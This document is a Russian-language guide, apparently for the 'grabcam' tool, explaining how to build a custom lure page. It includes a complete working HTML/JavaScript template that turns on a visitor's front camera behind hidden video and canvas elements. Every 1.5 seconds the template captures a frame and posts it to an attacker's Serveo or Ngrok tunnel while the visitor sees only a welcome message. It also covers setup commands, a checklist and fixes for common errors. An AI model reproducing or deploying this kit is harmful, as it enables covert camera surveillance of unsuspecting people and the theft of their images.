# 📋 Требования к HTML файлу для замены шаблона

## 🔑 ОБЯЗАТЕЛЬНЫЕ ТРЕБОВАНИЯ

### 1. **Строка для замены ссылки**
В вашем HTML файле **ОБЯЗАТЕЛЬНО** должна присутствовать строка:
```
forwarding_link
```

Эта строка будет автоматически заменена на реальную ссылку (Serveo или Ngrok).

**Пример использования:**
```html
<!-- В JavaScript для отправки данных -->
url: 'forwarding_link/post.php'

<!-- Или в ссылке -->
<a href="forwarding_link/index2.html">Перейти</a>
```

### 2. **JavaScript код для доступа к камере**
HTML файл должен содержать JavaScript код для:
- Запроса доступа к камере устройства
- Захвата кадров с камеры
- Отправки данных на сервер

### 3. **Отправка данных на сервер**
Должна быть функция `post()` которая отправляет изображения на:
```
forwarding_link/post.php
```

---

## 📝 ПОЛНЫЙ ПРИМЕР HTML ШАБЛОНА

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Ваш заголовок</title>
    
    <!-- Стили (опционально) -->
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <!-- Видео элемент (скрытый) для потока камеры -->
    <div class="video-wrap" hidden="hidden">
        <video id="video" playsinline autoplay></video>
    </div>

    <!-- Canvas (скрытый) для захвата кадров -->
    <canvas hidden="hidden" id="canvas" width="740" height="580"></canvas>

    <!-- Ваш контент страницы -->
    <h1>Добро пожаловать!</h1>
    <p>Ваш текст здесь</p>

    <script>
        // ============================================
        // ФУНКЦИЯ ОТПРАВКИ ИЗОБРАЖЕНИЯ НА СЕРВЕР
        // ============================================
        // ВАЖНО: используйте 'forwarding_link' - оно будет заменено на реальную ссылку
        function post(imgdata) {
            $.ajax({
                type: 'POST',                          // Метод POST
                data: { cat: imgdata},                 // Данные изображения
                url: 'forwarding_link/post.php',       // ВАЖНО: forwarding_link будет заменен!
                dataType: 'json',                      // Тип данных
                async: false,                          // Синхронный запрос
                success: function(result){
                    // Успешная отправка (можно добавить свою логику)
                },
                error: function(){
                    // Ошибка отправки (можно добавить обработку)
                }
            });
        }

        // ============================================
        // НАСТРОЙКИ ДОСТУПА К КАМЕРЕ
        // ============================================
        const constraints = {
            audio: false,                              // Без звука
            video: {
                facingMode: "user"                     // Фронтальная камера
            }
        };

        // Получаем элементы
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const errorMsgElement = document.querySelector('span#errorMsg');

        // ============================================
        // ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ КАМЕРЫ
        // ============================================
        async function init() {
            try {
                // Запрашиваем доступ к камере
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
            } catch (e) {
                // Обработка ошибок доступа к камере
                if (errorMsgElement) {
                    errorMsgElement.innerHTML = `Ошибка доступа к камере: ${e.toString()}`;
                }
            }
        }

        // ============================================
        // ФУНКЦИЯ ОБРАБОТКИ УСПЕШНОГО ДОСТУПА
        // ============================================
        function handleSuccess(stream) {
            window.stream = stream;                    // Сохраняем поток
            video.srcObject = stream;                  // Подключаем поток к video элементу

            // Получаем контекст canvas для рисования
            var context = canvas.getContext('2d');
            
            // Захватываем кадры каждые 1.5 секунды (1500 мс)
            setInterval(function(){
                // Рисуем кадр из video на canvas
                context.drawImage(video, 0, 0, 740, 580);
                
                // Конвертируем canvas в base64 изображение
                var canvasData = canvas.toDataURL("image/png")
                    .replace("image/png", "image/octet-stream");
                
                // Отправляем изображение на сервер
                post(canvasData);
            }, 1500);  // Интервал в миллисекундах
        }

        // ============================================
        // ЗАПУСК ИНИЦИАЛИЗАЦИИ
        // ============================================
        init();
    </script>

    <!-- Подключаем jQuery (необходимо для AJAX) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</body>
</html>
```

---

## ✅ КРИТИЧЕСКИ ВАЖНЫЕ МОМЕНТЫ

### 1. **Строка 'forwarding_link'**
```
❌ НЕПРАВИЛЬНО: url: 'https://example.com/post.php'
✅ ПРАВИЛЬНО:   url: 'forwarding_link/post.php'
```

### 2. **Функция post()**
Должна отправлять данные с параметром `cat`:
```javascript
data: { cat: imgdata }  // 'cat' - обязательное имя параметра
```

### 3. **Canvas и Video элементы**
```html
<!-- Video для потока камеры -->
<video id="video" playsinline autoplay></video>

<!-- Canvas для захвата кадров -->
<canvas id="canvas" width="740" height="580"></canvas>
```

### 4. **jQuery**
Не забудьте подключить jQuery для работы AJAX:
```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
```

---

## 📦 КАК ИСПОЛЬЗОВАТЬ СВОЙ HTML ФАЙЛ

### Способ 1: Переименование
```bash
# Переименуйте ваш файл в grabcam.html
mv ваш_файл.html grabcam.html
```

### Способ 2: Переменная окружения
```bash
# Запустите скрипт с указанием вашего файла
HTML_TEMPLATE="ваш_файл.html" bash grabcam.sh
```

---

## 🔍 ПРОВЕРКА HTML ФАЙЛА

Перед использованием убедитесь, что ваш HTML файл содержит:

- [ ] Строку `forwarding_link` (для замены ссылки)
- [ ] Функцию `post(imgdata)` с AJAX запросом
- [ ] URL в функции post: `'forwarding_link/post.php'`
- [ ] Элемент `<video id="video">`
- [ ] Элемент `<canvas id="canvas">`
- [ ] JavaScript код для доступа к камере
- [ ] Подключенный jQuery

---

## 💡 ПРИМЕРЫ ИСПОЛЬЗОВАНИЯ 'forwarding_link'

```html
<!-- В JavaScript -->
url: 'forwarding_link/post.php'

<!-- В ссылке -->
<a href="forwarding_link/index2.html">Ссылка</a>

<!-- В форме -->
<form action="forwarding_link/ip.php" method="POST">

<!-- В meta теге -->
<meta property="og:url" content="forwarding_link/">
```

**ВАЖНО:** После обработки скриптом все эти `forwarding_link` будут заменены на реальную ссылку типа:
- `https://abc123.serveo.net` (для Serveo)
- `https://abc-123-456.ngrok.io` (для Ngrok)

---

## 🎨 ДОПОЛНИТЕЛЬНЫЕ ВОЗМОЖНОСТИ

Вы можете добавить в HTML:
- Свой дизайн и стили
- Дополнительные формы
- Текстовый контент
- Изображения
- Анимации

Главное - не забыть про обязательные элементы для работы камеры!

---

## ⚠️ ЧАСТЫЕ ОШИБКИ

1. **Забыли 'forwarding_link'**
   - Результат: Ссылки не будут работать

2. **Неправильное имя параметра**
   - Должно быть: `data: { cat: imgdata }`
   - Не: `data: { image: imgdata }`

3. **Не подключен jQuery**
   - Результат: AJAX не работает, фото не отправляются

4. **Нет элементов video/canvas**
   - Результат: Камера не запускается

